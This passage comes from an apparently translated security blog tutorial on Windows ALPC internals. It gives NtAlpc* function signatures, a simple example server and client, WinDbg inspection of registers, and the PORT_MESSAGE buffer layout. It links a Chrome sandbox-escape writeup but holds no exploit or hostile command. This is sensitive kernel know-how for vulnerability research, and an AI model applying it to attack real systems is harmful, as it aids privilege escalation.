them into an ALPC_INFO structure and passes it as the final parameter.</li><li>This structure is copied into the ALPC object when the port is created and later referenced internally.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_INFO</span></span><span class="hljs-class">{</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_LPCMODE               0x001000 <span class="hljs-comment">// Operate like an LPC port</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_CANIMPERSONATE        0x010000 <span class="hljs-comment">// Allow impersonation</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_REQUEST_ALLOWED       0x020000 <span class="hljs-comment">// Allow message requests</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_SEMAPHORE             0x040000 <span class="hljs-comment">// Enable synchronization mechanism</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_HANDLE_EXPOSE         0x080000 <span class="hljs-comment">// Allow handle exposure</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_PARENT_SYSTEM_PRACESS 0x100000 <span class="hljs-comment">// Kernel ALPC interface (system process parent)</span></span>    ULONG Flags;    SECURITY_QUALITY_OF_SERVICE PortQos;    ULONG MaxMessageSize;    ULONG unknown1;    CHAR  cReserved1[<span class="hljs-number">8</span>];    ULONG MaxViewSize;    CHAR  cReserved2[<span class="hljs-number">8</span>];} ALPC_INFO, *PALPC_INFO;</code></pre><blockquote><p><strong>NtAlpcConnectPort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>The PortName parameter specifies the name of the port to connect to, along with various optional settings. The kernel searches for the ALPC Connection Port object with the given name and then proceeds to request a connection.</li></ul><p><strong>Important ConnectionFlags values</strong></p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_SYNC_CONNECTION   0x020000 <span class="hljs-comment">// Synchronous connection</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_USER_WAIT_MODE    0x100000 <span class="hljs-comment">// Wait in user mode</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_WAIT_IS_ALERTABLE 0x200000 <span class="hljs-comment">// Alertable wait</span></span></code></pre><ul><li>By default, the connection is asynchronous.<ul><li>This means the client can obtain a handle <strong>before</strong> the server has actually processed and accepted the connection request.</li><li>So if the client sends a message while the server hasn&#x2019;t handled the connection yet, it can result in an error.</li></ul></li></ul><blockquote><p><strong>NtAlpcSendWaitReceivePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>This is the most important function: with this single function, you can send and receive messages at the same time!!</li><li>SendMessage, ReceiveMessage are literally the send/receive message buffers.</li><li>SendMessageAttributes, ReceiveMessageAttributes are used to request or receive extra actions along with the message (section mapping, passing handles, etc.).</li></ul><h2 id="2-ALPC-Communication-Flow"><a href="#2-ALPC-Communication-Flow" class="headerlink" title="2. ALPC Communication Flow"></a>2. ALPC Communication Flow</h2><p>Alright, now that we roughly know what each function does, let&#x2019;s look at the actual communication flow. Earlier, I mentioned that an ALPC communication scenario involves <strong>three</strong> ALPC ports:</p><ol><li>The ALPC connection port created by the server process</li><li>The ALPC server communication port newly created by the kernel when a client connects</li><li>The ALPC client communication port</li></ol><p>We use these three, but just listing them like this doesn&#x2019;t make it very intuitive&#x2026;</p><p><del>At least it didn&#x2019;t for me&#x3160;</del></p><p>In reality, it <em>looks</em> like three logical ports exist during ALPC communication, but under the hood it&#x2019;s more like multiple endpoints being created on top of a single ALPC port object.</p><p>Let&#x2019;s walk through the communication flow step by step!</p><p><img src="image%205.png" alt="[&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG](https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape)"></p><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG</a></p><p>The function we should pay the most attention to is, again, <code>NtAlpcSendWaitReceivePort()</code>. This guy is basically responsible for all the request/response message exchange. In order, the flow looks like this:</p><ol><li>The server process calls <code>NtAlpcCreatePort()</code> to create an ALPC port.<ul><li>Example name: <code>\RPC Control\HackyBoiz</code></li></ul></li><li><p>The kernel creates the ALPC port object and returns a handle to the server.</p><p> &#x2192; This is the <strong>ALPC Connection Port!</strong></p></li><li><p>The server calls <code>NtAlpcSendWaitReceivePort()</code> and waits for a client connection.</p></li><li>The client calls <code>NtAlpcConnectPort()</code>.<ul><li>Name of the server port to connect to: <code>\RPC Control\HackyBoiz</code></li><li>(Optional) Initial message to send to the server</li><li>(Optional) Server SID to verify it&#x2019;s talking to the correct server</li><li>(Optional) Additional message attributes</li></ul></li><li>This connection request is delivered to the server, and the server calls <code>NtAlpcAcceptConnectPort()</code> to either accept or reject the connection.<ul><li>The last argument is a boolean: <code>TRUE</code> means accept, <code>FALSE</code> means reject.</li></ul></li><li>If the connection is accepted, the kernel creates a new ALPC Communication Port and returns handles to both the server and the client.</li><li>From this point on, messages are no longer sent through the Connection Port, but through this new Communication Port.</li></ol><p>Now it&#x2019;s starting to make a bit more sense, right?</p><p>Good. Then let&#x2019;s actually debug it and see it in action.</p><p>You can grab an example ALPC implementation here:</p><p><a href="https://github.com/DownWithUp/ALPC-Example">https://github.com/DownWithUp/ALPC-Example</a></p><p>We&#x2019;ll run this code and walk through the communication process ourselves! XD</p><blockquote><p>Server.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_MSG_LEN 0x500</span><span class="hljs-function">LPVOID <span class="hljs-title">AllocMsgMem</span><span class="hljs-params">(SIZE_T Size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE)));}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CreatePortAndListen</span><span class="hljs-params">(LPCWSTR PortName)</span></span><span class="hljs-function"></span>{    ALPC_PORT_ATTRIBUTES    serverPortAttr;    OBJECT_ATTRIBUTES       objPort;    UNICODE_STRING          usPortName;    PORT_MESSAGE            pmRequest;    PORT_MESSAGE            pmReceive;    NTSTATUS                ntRet;    BOOLEAN                 bBreak;    HANDLE                  hConnectedPort;    HANDLE                  hPort;    SIZE_T                  nLen;    LPVOID                  lpMem;    BYTE                    bTemp;      RtlInitUnicodeString(&amp;usPortName, PortName);    InitializeObjectAttributes(&amp;objPort, &amp;usPortName, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    RtlSecureZeroMemory(&amp;serverPortAttr, <span class="hljs-keyword">sizeof</span>(serverPortAttr));    serverPortAttr.MaxMessageLength = MAX_MSG_LEN;    ntRet = NtAlpcCreatePort(&amp;hPort, &amp;objPort, &amp;serverPortAttr);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcCreatePort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        nLen = <span class="hljs-keyword">sizeof</span>(pmReceive);        ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmReceive, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        <span class="hljs-keyword">if</span> (!ntRet)        {            RtlSecureZeroMemory(&amp;pmRequest, <span class="hljs-keyword">sizeof</span>(pmRequest));            pmRequest.MessageId = pmReceive.MessageId;            pmRequest.u1.s1.DataLength = <span class="hljs-number">0x0</span>;            pmRequest.u1.s1.TotalLength = pmRequest.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            ntRet = NtAlpcAcceptConnectPort(&amp;hConnectedPort, hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmRequest, <span class="hljs-literal">NULL</span>, TRUE); <span class="hljs-comment">// 0</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcAcceptConnectPort: 0x%X\n&quot;</span>, ntRet);            <span class="hljs-keyword">if</span> (!ntRet)            {                bBreak = TRUE;                <span class="hljs-keyword">while</span> (bBreak)                {                    nLen = MAX_MSG_LEN;                    lpMem = AllocMsgMem(nLen);                    NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (PPORT_MESSAGE)lpMem, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);                    pmReceive = *(PORT_MESSAGE*)lpMem;                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), <span class="hljs-string">&quot;exit\n&quot;</span>))                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received &apos;exit&apos; command\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                        ntRet = NtAlpcDisconnectPort(hPort, <span class="hljs-number">0</span>);                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcDisconnectPort: %X\n&quot;</span>, ntRet);                        CloseHandle(hConnectedPort);                        CloseHandle(hPort);                        ExitThread(<span class="hljs-number">0</span>);                    }                    <span class="hljs-keyword">else</span>                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received Data: &quot;</span>);                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= pmReceive.u1.s1.DataLength; i++)                        {                            bTemp = *(BYTE*)((BYTE*)lpMem + i + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));                            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%X &quot;</span>, bTemp);                        }                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                    }                }            }        }    }    ExitThread(<span class="hljs-number">0</span>);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    HANDLE hThread;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] ALPC-Example Server\n&quot;</span>);    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)&amp;CreatePortAndListen, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    WaitForSingleObject(hThread, INFINITE);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Shuting down server\n&quot;</span>);    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><blockquote><p>Client.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span>{    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    UNICODE_STRING  usPort;    PORT_MESSAGE    pmSend;    PORT_MESSAGE    pmReceive;    NTSTATUS        ntRet;    BOOLEAN         bBreak;    SIZE_T          nLen;    HANDLE          hPort;    LPVOID          lpMem;     CHAR            szInput[MSG_LEN];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ALPC-Example Client\n&quot;</span>);    RtlInitUnicodeString(&amp;usPort, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>);    RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));    pmSend.u1.s1.DataLength = MSG_LEN;    pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(pmSend);    lpMem = CreateMsgMem(&amp;pmSend, MSG_LEN, <span class="hljs-string">L&quot;Hello HackyBoiz!&quot;</span>);    ntRet = NtAlpcConnectPort(&amp;hPort, &amp;usPort, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcConnectPort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] type &apos;exit&apos; to disconnect from the server\n&quot;</span>);        bBreak = TRUE;        <span class="hljs-keyword">while</span> (bBreak)        {            RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));            RtlSecureZeroMemory(&amp;szInput, <span class="hljs-keyword">sizeof</span>(szInput));            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);            fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);            pmSend.u1.s1.DataLength = <span class="hljs-built_in">strlen</span>(szInput);            pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);            ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, (PPORT_MESSAGE)lpMem, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcSendWaitReceivePort: 0x%X\n&quot;</span>, ntRet);            HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);        }    }    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><p>If you build and run Server.c, you can see that a server ALPC port is created under \RPC Control.</p><p><img src="image%206.png" alt="image.png"></p><p>Now let&#x2019;s debug the server side with WinDbg. First, take a look at NtAlpcCreatePort:</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p><img src="image%207.png" alt="image.png"></p><p>After setting a breakpoint, you&#x2019;ll see that rdx points to the ObjectAttributes. We&#x2019;ll look at Attributes in more detail later, but inside this structure there is an ObjectName. The OBJECT_ATTRIBUTES structure looks like this:</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ATTRIBUTES</span> {</span>    ULONG           Length;    HANDLE          RootDirectory;    PUNICODE_STRING ObjectName;   <span class="hljs-comment">// &#x2190; this one</span>    ULONG           Attributes;    PVOID           SecurityDescriptor;    PVOID           SecurityQualityOfService;} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</code></pre><p>So rdx + 0x10 should be the ObjectName, right? If we inspect that:</p><p><img src="image%208.png" alt="image.png"></p><p>You can see that the port is created with the name \RPC Control\HackyBoiz!</p><p>Now let&#x2019;s switch to the client side and debug the communication with WinDbg.</p><p><img src="image%209.png" alt="image.png"></p><p>Once we run the client, the server accepts the connection, and the client can start sending messages. Let&#x2019;s look at that part in more detail.</p><p><img src="image%2010.png" alt="image.png"></p><p>First, we inspect the initial connection call to <code>NtAlpcConnectPort</code>:</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName, <span class="hljs-comment">// &lt;- here</span></span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>rdx holds the PortName. If we dump that, we can confirm that it&#x2019;s pointing to the HackyBoiz port we set up on the server!</p><p>Once the Connect request is sent, the server decides whether to accept it or not.</p><p>Looking at the NtAlpcAcceptConnectPort call in Server.c:</p><pre><code class="hljs cpp">ntRet = NtAlpcAcceptConnectPort(    &amp;hConnectedPort,   <span class="hljs-comment">// OUT PHANDLE PortHandle  &#x2192; rcx</span>    hPort,     <span class="hljs-number">0</span>,    <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       &amp;pmRequest,         <span class="hljs-literal">NULL</span>,               TRUE              );</code></pre><p>The arguments are set up like this.</p><ul><li>rcx is the handle that the server will receive for the new communication port. After the syscall, you&#x2019;ll see that hConnectedPort now holds the actual ALPC server communication port handle.</li></ul><p>Since the last argument AcceptConnection is TRUE, the connection is accepted, and both sides can now exchange messages over this communication port!</p><h2 id="3-ALPC-Messaging"><a href="#3-ALPC-Messaging" class="headerlink" title="3. ALPC Messaging"></a>3. ALPC Messaging</h2><p>Now that we&#x2019;ve seen how ALPC connects, let&#x2019;s look at the actual message format going back and forth.</p><p>In ALPC, messages always have the following layout:</p><p><img src="image%2011.png" alt="image.png"></p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload(Data) ]</code></pre><p>The front is the fixed PORT_MESSAGE header, and after that comes the actual text/binary payload we want to send.</p><h3 id="3-1-PORT-MESSAGE-structure"><a href="#3-1-PORT-MESSAGE-structure" class="headerlink" title="3.1. PORT_MESSAGE structure"></a>3.1. PORT_MESSAGE structure</h3><p>The header structure looks like this:</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PORT_MESSAGE</span></span><span class="hljs-class">{</span>    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT DataLength;   <span class="hljs-comment">// Actual payload length</span>            USHORT TotalLength;  <span class="hljs-comment">// Total size = PORT_MESSAGE + payload</span>        } s1;        ULONG Length;    } u1;    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT Type;             <span class="hljs-comment">// Message type</span>            USHORT DataInfoOffset;   <span class="hljs-comment">// Attribute area offset</span>        } s2;        ULONG ZeroInit;    } u2;    <span class="hljs-keyword">union</span> {        CLIENT_ID ClientId;          <span class="hljs-comment">// Sender process/thread ID</span>        <span class="hljs-keyword">double</span>    DoNotUseThisField; <span class="hljs-comment">// (alignment)</span>    };    ULONG MessageId;                 <span class="hljs-comment">// Message identifier</span>    <span class="hljs-keyword">union</span> {        SIZE_T ClientViewSize;       <span class="hljs-comment">// Section view size</span>        ULONG  CallbackId;           <span class="hljs-comment">// Callback ID</span>    };} PORT_MESSAGE, *PPORT_MESSAGE;</code></pre><p>In practice, we usually only care about around four fields:</p><ul><li><p>u1.s1.DataLength</p><p>  &#x2192; Length of the payload</p></li><li><p>u1.s1.TotalLength</p><p>  &#x2192; sizeof(PORT_MESSAGE) + DataLength</p><p>  &#x2192; Used by the kernel to know the total size of the message</p></li><li><p>ClientId</p><p>  &#x2192; Process and thread ID of the sender</p></li><li><p>MessageId / CallbackId</p><p>  &#x2192; Used to match requests and responses</p></li></ul><p>So the actual format is pretty straightforward.</p><p>If we look again at the example client code:</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span><span class="hljs-function">    LPVOID lpMem </span>= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}</code></pre><p>Here, lpMem is exactly:</p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload ]</code></pre><p>A fully-formed ALPC message buffer.</p><p>In main() we use it like this:</p><pre><code class="hljs cpp">RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);pmSend.u1.s1.DataLength  = <span class="hljs-built_in">strlen</span>(szInput);pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);ntRet = NtAlpcSendWaitReceivePort(    hPort,                <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,                    <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>                  <span class="hljs-comment">// Timeout</span>);</code></pre><p>To summarize:</p><ol><li>We set DataLength and TotalLength inside pmSend.</li><li><p>CreateMsgMem() builds a single buffer lpMem with:</p><p> [ pmSend | user input string ]</p></li><li><p>We pass lpMem as SendMessage to NtAlpcSendWaitReceivePort.</p></li></ol><p>Of course, we should also look at how the message actually looks in memory during debugging.</p><p><img src="image%2012.png" alt="image.png"></p><p>Let&#x2019;s check what the buffer looks like when the client sends <strong>&#x201C;Hello HackyBoiz!&#x201D;</strong>.</p><pre><code class="hljs cpp">ntRet = NtAlpcSendWaitReceivePort(    hPort,          <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,              <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>            <span class="hljs-comment">// Timeout</span>);</code></pre><p>In our code, NtAlpcSendWaitReceivePort is called like this.</p><p>lpMem should contain the message we&#x2019;re sending. Let&#x2019;s inspect it!</p><p><img src="image%2013.png" alt="image.png"></p><p>r8 is the pointer to the full message buffer, and we can clearly see PORT_MESSAGE followed by &#x201C;Hello HackyBoiz!&#x201D;.</p><p>The first DWORD is 00390011 because:</p><ul><li>Lower 2 bytes = 0x0011 &#x2192; DataLength = 0x11 = 17 (string length)</li><li>Upper 2 bytes = 0x0039 &#x2192; TotalLength = 0x39 = 57 (PORT_MESSAGE + payload)</li></ul><p>This is the buffer that gets copied from user mode to kernel mode, then from the server&#x2019;s kernel-side buffer to the server&#x2019;s receive buffer.</p><h2 id="4-ALPC-Message-Attribute"><a 